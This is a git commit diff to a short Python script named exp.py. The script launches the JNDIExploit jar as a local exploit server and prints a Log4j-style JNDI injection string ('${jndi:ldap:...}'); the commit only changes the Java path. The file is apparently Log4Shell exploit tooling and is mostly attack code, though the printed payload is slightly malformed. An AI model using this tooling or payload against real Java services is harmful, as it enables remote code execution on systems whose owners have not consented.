02f7f858fcb7afac9c5e3959267fd4af4cb3873e
ZSD <36792635+JaneMandy@users.noreply.github.com>
2021-12-11 01:18:36 +0800

    Update exp.py

--- exp.py
+++ exp.py
@@ -1,5 +1,6 @@
 import subprocess,os,sys,base64
-command=["C:\\Program Files\\Java\\jdk1.8.0_301\\bin\\java","-jar","JNDIExploit-1.2-SNAPSHOT.jar","--ip","127.0.0.1","-p","8000"]
+Path="java"
+command=[Path,"-jar","JNDIExploit-1.2-SNAPSHOT.jar","--ip","127.0.0.1","-p","8000"]
 subp = subprocess.call(" ".join(command)+" -u")
 
 print("Generate:${jndi:ldap:://127.0.0.1/} ")
